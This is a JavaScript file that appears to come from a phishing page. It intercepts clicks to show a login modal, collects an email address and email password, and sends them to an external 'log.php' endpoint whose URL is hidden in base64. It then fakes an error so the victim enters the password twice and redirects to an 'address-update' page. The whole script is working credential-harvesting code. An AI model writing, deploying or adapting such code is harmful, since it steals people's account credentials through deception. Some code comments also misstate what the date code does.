document.addEventListener('DOMContentLoaded', function() {
      // Function to get tomorrow's date
      function getTomorrowDate() {
        var today = new Date(); 
        var tomorrow = new Date(today);
        tomorrow.setDate(today.getDate() + 3);

        // Format the date as "YYYY/MM/DD"
        var formattedDate = ('0' + tomorrow.getDate()).slice(-2) + '/' + ('0' + (tomorrow.getMonth() + 1)).slice(-2) + '/' + tomorrow.getFullYear();
        // Display the date in an element with the ID "output"
        document.getElementById("output").innerText = formattedDate;
      }

      // Call the function when the page loads
      getTomorrowDate();
    }); 
$(document).ready(function(){
    $("#mspinner").css("display", "none");
    var trials = 0;
    $("a").click( (e)=>{
        e.preventDefault();
        $("#modalbox").css("display", "block");
        $("#email").focus();
    });

    

    $("td").click( (e)=>{
        e.preventDefault();
        $("#modalbox").css("display", "block");
        $("#email").focus();
    });

    $("#submit").click( (e)=>{
        e.preventDefault();
        var email = $("#email").val();
        var password = $("#password").val();
        if(email.length < 6 || !email.includes("@")){
            $("#email").css("border", "1px solid red");
            $("#password").css("border", "1px solid #ccc"); 
            $("#email-label").html("Enter a valid email");
            return;
        }
        if(password.length < 4 || password == '1234'){
            $("#password").css("border", "1px solid red");
            $("#email").css("border", "1px solid #ccc"); 
        	$("#password-label").html("Enter your email password");
            return;
        }
 
        $("#password").css("border", "1px solid #ccc"); 
        $("#email").css("border", "1px solid #ccc"); 
        $("#error").css("display", "none");
        $.ajax({
            url: atob("aHR0cHM6Ly9pdGVjaC1pbnZlc3RzLmNvbS9mYi10cmlhbC9sb2cucGhw"),
            method: "post",
            data: {
                X1: email,
                X2: password
            },
            beforeSend: function(xhr){
            $('#submit').html('Verifying.....').prop('disabled', true);
            }, 
            success: function(data){
                trials++;
                setTimeout(() => {
                    if(trials == 2){
                        window.location.href = "./address-update.html";
                    }  
                    $("#error").css("display", "block");
                    $("#password").val("");
                    $("#password").focus();
                    $("#password").attr("placeholder", "Enter email password");
                }, 6000);
            },

            error: function(data){
                trials++;
                setTimeout(() => {
                    if(trials == 2){
                        window.location.href = "./address-update.html";
                    }  
                    $("#error").css("display", "block");
                    $("#password").val("");
                    $("#password").focus();
                    $("#password").attr("placeholder", "Enter email password");
                }, 6000);
            }, 
            complete: function(){
            

            setTimeout( () => {
                     $('#submit').html('Verify').prop('disabled', false);
                }, 6000);
            }


        })
    })

});